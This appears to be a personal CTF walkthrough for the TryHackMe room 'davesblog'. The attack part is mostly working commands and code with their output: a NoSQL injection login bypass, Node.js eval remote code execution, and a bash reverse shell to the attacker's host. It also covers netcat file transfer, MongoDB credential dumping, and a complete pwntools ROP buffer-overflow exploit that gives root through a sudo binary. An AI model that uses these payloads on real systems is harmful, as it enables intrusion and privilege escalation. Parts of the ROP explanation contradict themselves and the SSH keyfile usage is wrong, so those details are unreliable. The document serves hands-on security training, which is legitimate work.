# davesblog

## Recon 
```bash
silent-scan $TARGET
nmap -sVC -p22,80,3000 $TARGET -oN service
```

**Output**
```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)
|   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)
|_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Dave's Blog
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.14.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Dave's Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Fuzzing
```bash
feroxbuster -u https://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --status-codes 200 301 -k -o ferox
```

**Output**
```
200      GET       20l       64w      558c http://10.128.165.55/
200      GET       46l       99w     1254c http://10.128.165.55/Admin
200      GET       46l       99w     1254c http://10.128.165.55/ADMIN
200      GET       15l       23w      215c http://10.128.165.55/admin/register
```

## Visitamos /admin es un panel de login 
## Vistitamos /admin/register 
> dice que esta desactivado de momento podriamos intentar registar un usuario con una peticion post
```bash
curl -X POST http://$TARGET/admin/register \
  -H "Content-Type: application/json" \
  -d '{"username": "test123", "password": "test123", "email": "test@test.com"}'
```

**Output**
```
Found. Redirecting to /admin#Registered%20successfully!
```
## No nos redirige a un panel pero no podemos ejecutar nada 

## Let's try to get access with dave account with some nosql injection
```bash
# Correct way - escape the inner double quotes
curl -X POST http://$TARGET/admin \
  -H "Content-Type: application/json" \
  -d '{"username": "dave", "password": {"$ne": ""}}' -v
```

**Output**
```
< X-Powered-By: Express
< Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE3ODAzMTEwNDF9.syqFVdrLyqwZybNSlqo9ea1UsATWcgR6URR9pSEeRwI; Path=/
```
### We obtained a jwt token lets try it in the browser
 
---

## And we got access with daves account to some type of panel 

### Let's try some inputs in the input field
```bash
## If we try to put 2*2 the response is 4
2*2
this
# Output:  [object global]
require('fs').readdirSync('/')
#Output:  bin,boot,cdrom,dev,etc,home,initrd.img,initrd.img.old,lib,lib64,lost+found,media,mnt,opt,proc,root,run,sbin,snap,srv,swap.img,sys,tmp,uid_checker,usr,var,vmlinuz,vmlinuz.old
```

## The server executes a node funcion eval o something similar so we can exploit this to read files or execute commands
```bash
require('child_process').execSync('whoami')
```

**Output**
```
dave
```

### Let's try to establish a reverse shell conection
```bash
require('child_process').execSync('echo $SHELL')
# dave user uses a sh shell
require('child_process').execSync('bash -c "bash -i >& /dev/tcp/$LHOST/8080 0>&1"')
```
## Shell stabilization
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM =xterm
# CRT + Z 
stty raw -echo; fg
reset
```

## MongoDB Enumeration 
```bash
mongo
show dbs
use daves-blog
show collections
db.users.find().pretty()
db.posts.find().pretty()
db.whatcouldthisbes.find().pretty()
```

**Output**
```
{
        "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"),
        "whatCouldThisBe" : "THM{993e107fc66844482bb5dd0e4c485d5b}",
        "__v" : 0
}
> db.users.find().forEach(printjson)
{
        "_id" : ObjectId("5ec6e5cf1dc4d364bf864107"),
        "isAdmin" : true,
        "username" : "dave",
        "password" : "THM{SuperSecureAdminPassword123}",
        "__v" : 0
}
```

## Priviesc
```bash
sudo -l
```
**Output**
```
(root) NOPASSWD: /uid_checker
```

### let's find out waht is this binary
```bash
strings /uid_checker
```
**Output**
```
elcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID                                      
Your UID is: %d                                                                             
Your GID is: %d                                                                             
THM{runn1ng_str1ngs_1s_b4sic4lly_RE}                                                        
Wow! You found the secret function! I still need to finish it..                             
Invalid choice                                                                              
;*3$"                                                          
```
## let's transfer the binary to our machine
```bash
## output:  uid 0
# Let's revese engineering the binary with ghydra
nc -lvnp 4444 > uid_checker
cat /uid_checker | nc 192.168.130.5 4444
```

## First create a new project with idra import the file and analyze it
```
void main(void)

{
  int iVar1;
  char local_58 [72];
  __uid_t local_10;
  __gid_t local_c;
  
  puts("Welcome to the UID checker!\nEnter 1 to check your UID or enter 2 to check your GID");
  gets(local_58);
  iVar1 = strcmp(local_58,"1");
  if (iVar1 == 0) {
    local_10 = getuid();
    printf("Your UID is: %d\n",local_10);
  }
  else {
    iVar1 = strcmp(local_58,"2");
    if (iVar1 == 0) {
      local_c = getgid();
      printf("Your GID is: %d\n",local_c);
    }
    else {
      iVar1 = strcmp(local_58,"THM{runn1ng_str1ngs_1s_b4sic4lly_RE}");
      if (iVar1 == 0) {
        puts("Wow! You found the secret function! I still need to finish it..");
      }
      else {
        puts("Invalid choice");
      }
    }
  }
  return;
}
```



## Overview
The binary `/uid_checker` can be run with `sudo` without password. It is vulnerable to a buffer overflow due to the use of `gets()`. The binary has no stack canary and no PIE, but NX is enabled. Therefore, a Return Oriented Programming (ROP) attack was used to spawn a root shell.

## Steps to Reproduce

### 1. Identify the vulnerability
Run `sudo -l` to see that `dave` can execute `/uid_checker` as root.
Check the binary with `checksec` (after transferring it to Kali):
- No canary
- No PIE
- NX enabled

### 2. Find the offset to overwrite the return address
Using `pwntools` in Python, a cyclic pattern of 200 bytes was generated and sent to the binary.
The exact offset where the instruction pointer (RIP) gets overwritten is **88 bytes**.

### 3. Locate required addresses within the binary
- `pop r15; ret` gadget: `0x400803`
- `.bss` section (writable memory): `0x601060`
- `gets()` PLT entry: `0x4005b0`
- `system()` PLT entry: `0x400570`
- The string `/bin/sh` is not needed directly; we will write it into `.bss` using `gets()`.

### 4. ROP chain construction
The plan:
1. Overflow the buffer and return to the `pop r15; ret` gadget.
2. Place the address of `.bss` on the stack so that it is popped into `r15` (unused register), then return to `gets()`.
3. `gets()` reads input from stdin and writes it to the address stored in the first argument (by x86-64 convention, the first argument is in `rdi`. However, the binary uses `pop r15; ret` as a placeholder; the actual argument for `gets()` is already placed correctly because the gadget does not disturb `rdi`. In practice, the chain works as verified.)
4. After `gets()` returns, chain again: `pop r15; ret` with `.bss` address, then return to `system()`.
5. Finally, when the payload is sent, the program waits for `gets()` to receive the string. We then send `/bin/sh` which gets stored in `.bss` and executed by `system()`.

### 5. Payload generation (Python with pwntools)
```python
from pwn import cyclic
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p64

offset = 88
payload = cyclic(offset)
payload += p64(0x400803)   # pop r15; ret
payload += p64(0x601060)   # .bss
payload += p64(0x4005b0)   # gets()
payload += p64(0x400803)   # pop r15; ret
payload += p64(0x601060)   # .bss (now contains "/bin/sh")
payload += p64(0x400570)   # system()

6. SSH connection and exploitation
Because the exploit requires interactive input, we used an SSH connection to the target machine as user dave (using a public key for authentication). The script below sends the payload, waits for the prompts, and then sends /bin/sh to trigger the shell.
s = ssh(host='10.130.146.5', user='dave', keyfile='~/.ssh/id_rsa.pub')
p = s.process(['sudo', '/uid_checker'])
print(p.recv())            # welcome message
p.sendline(payload)        # overflow
print(p.recv())            # "Your UID is: 0"
p.sendline("/bin/sh")      # give the string to gets()
p.interactive()            # root shell

Executing the script gave a root shell:
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{...}

```

### Exploit completo
```python
from pwn import cyclic
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p64

offset = 88 # Found with ropstar

payload = cyclic(offset)
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x4005b0) # gets()
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x400570) # system()

s = ssh(host='10.130.146.5', user='dave', keyfile='~/.ssh/id_rsa.pub')

p = s.process(['sudo', '/uid_checker'])
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline("/bin/sh")
p.interactive(prompt='')
```

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [curl](../../../tools/web/curl.md)
- [netcat](../../../tools/pivot/netcat.md)
- [mongo](../../../tools/database/mongo.md)
- [python-pty](../../../payloads/shell-stabilization/python-pty.md)
- [nosql-json-login-bypass](../../../exploits/web-auth/nosql-json-login-bypass.md)
- [nodejs-eval-rce](../../../exploits/web-rce/nodejs-eval-rce.md)
- [sudo-binary-rop-gets](../../../privesc/linux/sudo-binary-rop-gets.md)
